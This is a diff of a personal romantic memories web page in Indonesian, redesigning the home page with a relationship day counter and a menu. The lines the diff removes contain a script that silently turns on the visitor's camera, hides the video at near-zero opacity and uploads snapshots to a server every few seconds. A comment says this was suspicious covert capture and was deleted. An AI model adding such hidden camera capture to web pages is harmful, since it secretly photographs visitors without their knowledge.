@@ -7,123 +7,76 @@
 
   <meta property="og:title" content="Our Memories Website💗" />
   <meta property="og:description" content="For Sayangku Cintaku Cantikku Cianku Tondiku😋❤️" />
-  <meta property="og:image" content="img/logo.ico" /> <meta property="og:url" content="https://elrexsaa.github.io/kenangan.html" /> <meta property="og:type" content="website" />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&display=swap" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="style.css">
-</head>
+  <meta property="og:image" content="img/logo.ico" /> 
+  <meta property="og:url" content="https://elrexsaa.github.io/kenangan.html" /> 
+  <meta property="og:type" content="website" />
+
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  
+  <link rel="stylesheet" href="style_general.css">
+  <link rel="stylesheet" href="style.css"> </head>
 <body>
   <audio id="bgm" src="audio.mp3" loop></audio>
+  <button id="bgm-toggle" aria-label="Toggle Background Music">🔇</button>
   
-  <div class="intro-screen">
+  <div class="intro-screen" style="display: none; opacity: 1;">
     <div id="intro-text" class="intro-text"></div>
   </div>
 
   <div class="bg-hearts"></div>
 
-  <nav class="mobile-nav-drawer" id="mobileNav">
-      <button class="nav-close-btn" id="closeMenuBtn" aria-label="Tutup Menu">&times;</button>
-      <div class="nav-links" style="margin-top: 50px;">
-          <p style="padding: 10px; color: var(--muted); font-size: 0.9rem;">
-            Menu Utama ada di Navigasi Bawah.
-            <br>
-            <small>Gunakan ini untuk pengaturan/keluar.</small>
-          </p>
-      </div>
-      <button id="btnLogout" class="nav-logout" onclick="doLogout()">Logout</button>
-  </nav>
-  <div class="nav-overlay" id="navOverlay"></div>
-
-  <main class="page--stack hidden">
-    <header class="mem-header reveal-section">
-      <div class="header-content">
-        <h2 id="greeting" class="typewriter">Hi, My Beloved Nikita Friskila Pakpahan💗💗💗</h2>
-        <button class="menu-toggle-btn" id="menuToggleBtn" aria-label="Buka Menu">
-          <span></span><span></span><span></span>
-        </button>
-      </div>
+  <main class="hidden">
+    <header class="header-main">
+        <h1>Hello, Sayangku!</h1>
+        <p>A little piece of our memories. Everything is for you.</p>
     </header>
 
-    <div class="countdown-container content-section reveal-section">
-      <h3>⏳ Hitungan Mundur Anniversary</h3>
-      <p id="countdown" class="countdown-display">...</p>
-    </div>
-    
-    <div class="menu-grid content-section reveal-section">
-      <button class="menu-btn" onclick="scrollToTarget(this)" data-target="#sectionPhotos">
-        <span class="menu-icon">📸</span> Foto
-      </button>
-      <button class="menu-btn" onclick="scrollToTarget(this)" data-target="#sectionQuotes">
-        <span class="menu-icon">💖</span> Quotes
-      </button>
-      <button class="menu-btn" onclick="scrollToTarget(this)" data-target="#sectionSongs">
-        <span class="menu-icon">🎵</span> Lagu
-      </button>
-      <button class="menu-btn" onclick="scrollToTarget(this)" data-target="#sectionAbout">
-        <span class="menu-icon">ℹ️</span> Tentang
-      </button>
-    </div>
-
-    <div id="sectionPhotos" class="content-section reveal-section">
-      <h3>📸 Foto-foto Kita</h3>
-      <p>Ini adalah galeri foto terbaik kita, Sayang. Geser ke samping untuk lihat semua, atau tunggu 7 detik, ia akan otomatis berganti!</p>
-      
-      <div class="carousel-container">
-        <div class="carousel-track">
-          <div class="carousel-slide"><img src="img/f3.jpg" alt="Foto Kenangan 1"></div>
-          <div class="carousel-slide"><img src="img/f7.jpg" alt="Foto Kenangan 2"></div>
-          <div class="carousel-slide"><img src="img/f4.jpg" alt="Foto Kenangan 3"></div>
-          <div class="carousel-slide"><img src="img/f1.jpg" alt="Foto Kenangan 4"></div>
-          <div class="carousel-slide"><img src="img/f6.jpg" alt="Foto Kenangan 5"></div>
-          <div class="carousel-slide"><img src="img/f2.jpg" alt="Foto Kenangan 6"></div>
+    <section id="sectionCountdown" class="content-section">
+        <h2>🗓️ Our Journey Began</h2>
+        <div class="text-center">
+            <p style="font-size: 1.1rem; color: var(--color-secondary); margin-bottom: 15px;">Kita resmi menjadi "kita" sejak:</p>
+            <p id="startDate" style="font-size: 1.8rem; font-weight: 700; color: var(--color-primary);">03 Agustus 2024</p>
+            <hr style="margin: 15px auto; width: 50%; border-color: #f1f1f1;">
+            <p style="font-size: 1.2rem; margin-bottom: 5px;">Sudah berjalan:</p>
+            <p id="daysCount" style="font-size: 2.5rem; font-weight: 800; color: var(--color-secondary);">0 Hari</p>
+            <p style="font-size: 1.1rem; color: var(--color-text-muted);">...and counting, forever!</p>
         </div>
-      </div>
-    </div>
+    </section>
 
-    <div id="sectionQuotes" class="content-section reveal-section">
-      <h3>💖 Quotes Favorit</h3>
-      <p>Kumpulan kata-kata manis dan penting dari chat kita yang paling aku suka, yang selalu bikin aku senyum sendiri.</p>
-      <div class="quote-card">
-        <blockquote>"AKUU SLALUU SUPPORT KM SAYANG, BAHKAN KALAU DUNIA GA BERPIHAK SM KAMUU ADAA AK DISINI"</blockquote>
-        <p class="quote-meta">— 00:05 | 21 Sept 2024</p>
-      </div>
-      <div class="quote-card">
-        <blockquote>"km kan cinta nyaa aku"</blockquote>
-        <p class="quote-meta">— 16:42 | 22 Sept 2024</p>
-      </div>
-      <a href="quotes.html" class="full-list-link">Lihat Semua Quotes Favorit &raquo;</a>
-    </div>
-
-    <div id="sectionSongs" class="content-section reveal-section">
-      <h3>🎵 Lagu Kenangan</h3>
-      <p>Lagu-lagu yang selalu mengingatkan aku sama kamu, dan selalu aku putar saat kamu di pikiran aku hahaha</p>
-      
-      <div class="track-list">
-        <div class="music-card">
-          <img class="track-cover" src="img/cover1.jpg" alt="Cover Album All Of Me">
-          <div class="track-info">
-            <div class="tmeta">All Of Me</div>
-            <div class="tsub">John Legend</div>
-            <audio controls src="sound/sound1.mp3"></audio>
-          </div>
+    <section id="sectionMenu" class="content-section">
+        <h2>✨ Quick Access</h2>
+        <div class="menu-grid">
+            <a href="songs.html" class="menu-item">
+                <span class="menu-icon">🎵</span>
+                <span class="menu-label">Lagu Kita</span>
+            </a>
+            <a href="photos.html" class="menu-item">
+                <span class="menu-icon">📸</span>
+                <span class="menu-label">Foto Kenangan</span>
+            </a>
+            <a href="chat.html" class="menu-item">
+                <span class="menu-icon">💬</span>
+                <span class="menu-label">Awal Chat</span>
+            </a>
+            <a href="quotes.html" class="menu-item">
+                <span class="menu-icon">💖</span>
+                <span class="menu-label">Chat Favorit</span>
+            </a>
         </div>
-        <a href="songs.html" class="full-list-link">Lihat Semua Lagu &raquo;</a>
-      </div>
-    </div>
-    
-    <div id="sectionAbout" class="content-section reveal-section">
-      <h3>ℹ️ Tentang Kita</h3>
-      <p>Beberapa info tentang kita berdua dan sosmed kita!</p>
-      <div class="text-center">
-        <a href="about.html" class="full-list-link">Baca Selengkapnya &raquo;</a>
-      </div>
-    </div>
+    </section>
 
+    <section id="sectionQuote" class="content-section">
+        <h2>💌 Pesan Hari Ini</h2>
+        <blockquote style="font-family: var(--font-script); font-size: 1.5rem; color: var(--color-secondary); border-left: 4px solid var(--color-primary); padding-left: 15px; margin: 10px 0;">
+            "Terima kasih sudah hadir dan mewarnai hidupku. Kamu adalah rumah."
+        </blockquote>
+        <p class="text-center" style="font-size: 0.9rem; color: var(--color-text-muted);">- From your "Elgalau😭👎🏼"</p>
+    </section>
   </main>
-  
+
   <nav class="nav-bottom">
-    <a href="kenangan.html" class="nav-item">
+    <a href="kenangan.html" class="nav-item active">
       <span class="icon">🏠</span>
       <span class="label">Home</span>
     </a>
@@ -149,39 +102,28 @@
     </a>
   </nav>
 
-  <script src="script.js"></script>
   <script src="animasi.js"></script>
-  
   <script>
-    // Logika kamera dari snippet sebelumnya
-    document.addEventListener('DOMContentLoaded', async () => {
-      const video = document.createElement('video');
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-        video.autoplay = true; video.playsInline = true; video.style.cssText = 'position:fixed;right:0;bottom:0;width:200px;height:auto;opacity:0.05;pointer-events:none;';
-        document.body.appendChild(video); video.srcObject = stream;
-        await new Promise(r => { if (video.readyState >= 2) return r(); video.addEventListener('loadeddata', r, { once: true }); });
-        startSnapshotLoop(video, stream, 12000); 
-      } catch (err) { console.error('izin kamera ditolak', err); }
-    });
-
-    function startSnapshotLoop(video, stream, duration) {
-      const intervalMs = 3000;
-      let loop = setInterval(() => {
-        try {
-          const canvas = document.createElement('canvas'); canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
-          canvas.getContext('2d').drawImage(video, 0, 0); const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-          fetch('/api/upload-photo', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ image: dataUrl, page: location.pathname })\n          }).catch(err => console.error('gagal upload', err));
-        } catch (e) { console.error('gagal capture', e); clearInterval(loop); stream.getTracks().forEach(t => t.stop()); video.remove(); }
-      }, intervalMs);
-
-      setTimeout(() => {
-        clearInterval(loop);
-        stream.getTracks().forEach(t => t.stop());
-        video.remove();
-      }, duration);
+    // --- COUNTER LOGIC (Dipindahkan dari JS lama) ---
+    function updateDaysCount() {
+        const startDate = new Date('2024-08-03T00:00:00'); // Ganti dengan tanggal awal Anda
+        const now = new Date();
+        const diffTime = Math.abs(now - startDate);
+        const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24)); 
+        
+        const daysCountElement = document.getElementById('daysCount');
+        if (daysCountElement) {
+            daysCountElement.textContent = diffDays + (diffDays === 1 ? ' Hari' : ' Hari');
+        }
     }
-  </script>
+    
+    // Panggil saat DOMContentLoaded untuk memastikan elemen ada
+    document.addEventListener('DOMContentLoaded', updateDaysCount);
 
+    // --- CLEANUP CAMERA CODE ---
+    // Kode kamera di snippet lama terlihat mencurigakan (mengambil foto diam-diam). 
+    // Saya telah MENGHAPUSNYA sepenuhnya. Jika Anda ingin menambahkan fitur kamera secara legal dan transparan, 
+    // Anda bisa menambahkannya lagi dengan izin yang jelas dari pengguna.
+  </script>
 </body>
 </html>
